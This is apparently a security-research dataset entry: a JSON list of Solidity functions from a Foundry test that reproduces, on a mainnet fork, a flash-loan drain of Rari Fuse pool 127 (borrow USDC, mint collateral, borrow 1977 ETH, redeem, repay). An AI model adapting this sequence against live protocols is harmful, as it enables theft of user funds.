[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        tokens;\n        amounts;\n        feeAmounts;\n        userData;\n\n        uint256 usdc_balance = usdc.balanceOf(address(this));\n        emit log_named_uint(\"Borrow USDC from balancer\", usdc_balance);\n        usdc.approve(address(fusdc_127), type(uint256).max);\n\n        fusdc_127.accrueInterest();\n\n        fusdc_127.mint(15_000_000_000_000);\n\n        uint256 fETH_Balance = fETH_127.balanceOf(address(this));\n\n        emit log_named_uint(\"fETH Balance after minting\", fETH_Balance);\n\n        usdc_balance = usdc.balanceOf(address(this));\n\n        emit log_named_uint(\"USDC balance after minting\", usdc_balance);\n\n        address[] memory ctokens = new address[](1);\n\n        ctokens[0] = address(fusdc_127);\n\n        rari_Comptroller.enterMarkets(ctokens);\n\n        fETH_127.borrow(1977 ether);\n\n        emit log_named_uint(\"ETH Balance of fETH_127_Pool after borrowing\", address(fETH_127).balance / 1e18);\n\n        emit log_named_uint(\"ETH Balance of me after borrowing\", address(this).balance / 1e18);\n\n        usdc_balance = usdc.balanceOf(address(this));\n\n        fusdc_127.approve(address(fusdc_127), type(uint256).max);\n\n        fusdc_127.redeemUnderlying(15_000_000_000_000);\n\n        usdc_balance = usdc.balanceOf(address(this));\n\n        emit log_named_uint(\"USDC balance after borrowing\", usdc_balance);\n\n        usdc.transfer(address(vault), usdc_balance);\n\n        usdc_balance = usdc.balanceOf(address(this));\n\n        emit log_named_uint(\"USDC balance after repayying\", usdc_balance);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 14_684_813); //fork mainnet at 14684813\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_uint(\"ETH Balance of fETH_127 before borrowing\", address(fETH_127).balance / 1e18);\n\n        payable(address(0)).transfer(address(this).balance);\n\n        emit log_named_uint(\"ETH Balance after sending to blackHole\", address(this).balance);\n\n        address[] memory tokens = new address[](1);\n\n        tokens[0] = address(usdc);\n\n        uint256[] memory amounts = new uint256[](1);\n\n        amounts[0] = 150_000_000 * 10 ** 6;\n\n        vault.flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n",
    "description": ""
  }
]